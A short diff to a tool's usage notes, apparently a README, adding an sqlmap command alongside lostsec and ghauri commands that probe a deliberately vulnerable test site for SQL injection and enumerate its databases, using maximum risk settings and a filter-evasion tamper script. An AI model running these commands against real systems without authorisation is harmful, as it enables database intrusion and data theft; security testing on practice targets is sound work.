@@ -15,3 +15,9 @@ sudo python3 ./lostsec.py -l testphp.vulnweb.com.output.txt -p payloads/xor.txt 
 ```
 ghauri -u "http://testphp.vulnweb.com/artists.php?artist=*" --dbs --batch --confirm --hostname --current-db
 ```
+
+### Sqlmap
+
+```
+sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=*' --batch --dbs --threads=5 --random-agent --risk=3 --level=5 --tamper=space2comment -v 3
+```
